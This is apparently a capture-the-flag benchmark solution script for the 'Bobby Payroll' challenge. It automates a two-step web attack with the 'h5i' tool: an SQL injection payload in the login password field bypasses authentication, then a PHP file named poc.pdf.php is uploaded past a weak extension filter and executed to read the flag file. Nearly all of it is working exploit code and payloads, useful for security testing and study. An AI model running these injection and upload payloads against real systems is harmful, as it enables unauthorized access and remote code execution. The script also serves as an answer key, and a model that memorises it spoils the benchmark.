#!/usr/bin/env bash
# XBEN-029-24 — "Bobby Payroll" (tags: arbitrary_file_upload, blind_sqli)
#
# Two steps, and the second needs the first. The login builds its password check
# by string-concatenating into `MD5(CONCAT(MD5('$password'), …))`, so a payload
# that closes those calls early turns the check into `OR '1'='1'`. That sets a
# PHP session, and the upload page requires one.
#
# The upload then accepts any name containing `.pdf` *anywhere*, so
# `poc.pdf.php` passes the check and lands in a directory PHP will execute.
#
# The session cookie is never handled by this script. The login response set it,
# h5i's jar stored it, and the upload carries it: chaining two requests through
# one session is the thing that makes this two commands instead of a program.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben029-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# 1. Log in as admin without the password. The table holds exactly one user, so
#    the first query still returns one row and only the second has to be broken.
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'form.submit=1' --set 'form.username=admin' \
    --set "form.password=x'),MD5('admin'))) OR '1'='1' -- " \
    --session "$SESSION" >/dev/null

# 2. Upload something PHP will run. `.pdf` appears in the name, which is all the
#    filter looks for.
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/upload.php' \
    --set 'multipart.invoice=<?php echo file_get_contents("/FLAG.txt"); ?>' \
    --set 'multipart.invoice.filename=poc.pdf.php' \
    --set 'multipart.invoice.content_type=application/pdf' \
    --session "$SESSION" >/dev/null

# 3. Ask for it back.
"$H5I" browser navigate "$URL/uploaded_invoices/poc.pdf.php" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
